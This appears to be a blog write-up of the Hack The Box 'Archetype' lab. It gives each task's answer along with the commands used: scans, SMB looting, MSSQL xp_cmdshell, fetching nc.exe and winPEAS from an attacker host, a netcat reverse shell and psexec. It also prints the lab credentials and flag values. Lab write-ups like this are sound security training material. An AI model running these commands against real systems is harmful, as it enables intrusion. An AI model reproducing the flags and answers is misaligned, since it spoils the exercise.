---
layout: post
title: "[HTB - Starting Point] Archetype"
date: 2022-10-18 09:00:00 +0800
categories: HTB
tags: [HTB, Starting Point]
---

## Task 1  
Q : Which TCP port is hosting a database server?  
``` text
[host] # nmap -sVC -p- --open -oA Archetype_full_scan <target_ip>
```
A : 1433  

## Task 2  
Q : What is the name of the non-Administrative share available over SMB?  
``` text
[host] # smbclient -N -L <target_ip>
```
A : backups  

## Task 3  
Q : What is the password identified in the file on the SMB share?  
``` text
[host] # smbclient -N \\\\<target_ip>\\backups
smb: \> ls
smb: \> get prod.dtsConfig
smb: \> exit
[host] # cat prod.dtsConfig
```
A : M3g4c0rp123  

## Task 4  
Q : What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?  
A : mssqlclient.py  

## Task 5  
Q : What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?  
``` text
[host] # impacket-mssqlclient -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@<target_ip>
SQL> ?
```
A : xp_cmdshell  

## Task 6  
Q : What script can be used in order to search possible paths to escalate privileges on Windows hosts?  
A : winpeas  

## Task 7  
Q : What file contains the administrator's password?  
``` text
# Get nc.exe and winPEASx64.exe on your host.
# Download nc.exe and winPEASx64.exe from our host to target machine.
[host] # python3 -m http.server
SQL> enable_xp_cmdshell
SQL> xp_cmdshell "powershell cd C:\Users\sql_svc\Desktop; wget http://<your_ip>:8000/nc.exe -outfile nc.exe"
SQL> xp_cmdshell "powershell cd C:\Users\sql_svc\Desktop; wget http://<your_ip>:8000/winPEASx64.exe -outfile winPEASx64.exe"

# Establish reverse shell
[host] # nc -nvlp 12345
SQL> xp_cmdshell "powershell C:\Users\sql_svc\Desktop\nc.exe -e cmd.exe <your_ip> 12345"

# from reverse shell, exec winPEASx64.exe
(reverse shell)> C:\Users\sql_svc\Desktop\winPEASx64.exe
```
A : ConsoleHost_history.txt  
(got administrator/MEGACORP_4dm1n!!)

## SUBMIT FLAG  
Q : Submit user flag  
``` text
SQL> xp_cmdshell "powershell type C:\Users\sql_svc\Desktop\user.txt"
```
A : 3e7b102e78218e935bf3f4951fec21a3  

## SUBMIT FLAG  
Q : Submit root flag  
``` text
[host] # impacket-psexec ARCHETYPE/administrator@<target_ip>
password: MEGACORP_4dm1n!!
C:\Windows\system32> cd C:\Users\Administrator
C:\Users\Administrator> dir /s *txt*
C:\Users\Administrator> type C:\Users\Administrator\Desktop\root.txt
```
A : b91ccec3305e98240082d4474b848528  
